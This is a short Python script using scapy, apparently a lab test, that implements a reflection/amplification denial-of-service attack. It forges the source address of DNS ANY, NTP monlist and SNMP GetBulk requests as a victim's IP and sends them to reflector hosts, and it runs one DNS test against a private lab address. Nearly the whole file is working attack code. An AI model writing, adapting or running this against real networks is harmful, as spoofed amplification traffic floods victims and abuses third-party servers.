import scapy.all as scapy
import random

def amp_attack(reflector, victim=None, service="DNS", port=None):
    src_ip = victim if victim else scapy.get_if_addr(scapy.conf.iface)
    port = port or {"DNS": 53, "NTP": 123, "SNMP": 161}.get(service, None)
    if not port:
        raise ValueError(f"No default port defined for {service}")

    if service == "DNS":
        pkt = scapy.IP(src=src_ip, dst=reflector)/scapy.UDP(sport=random.randint(1024,65535), dport=port)/scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com", qtype="ANY"))
    elif service == "NTP":
        pkt = scapy.IP(src=src_ip, dst=reflector)/scapy.UDP(sport=random.randint(1024,65535), dport=port)/scapy.Raw(load=b'\x17\x00\x03\x2a' + b'\x00' * 4)
    elif service == "SNMP":
        pkt = scapy.IP(src=src_ip, dst=reflector)/scapy.UDP(sport=random.randint(1024,65535), dport=port)/scapy.Raw(load=b'\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x19\x02\x04\x70\xb5\x50\x4b\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01\x05\x00')
    else:
        raise ValueError(f"Unsupported service: {service}")

    scapy.send(pkt, verbose=1)
    print(f"Sent {service} request to {reflector} (victim={victim or 'local'})")

if __name__ == "__main__":
    # changing the service and IP to test each one.
    amp_attack(reflector="192.168.56.2", service="DNS")

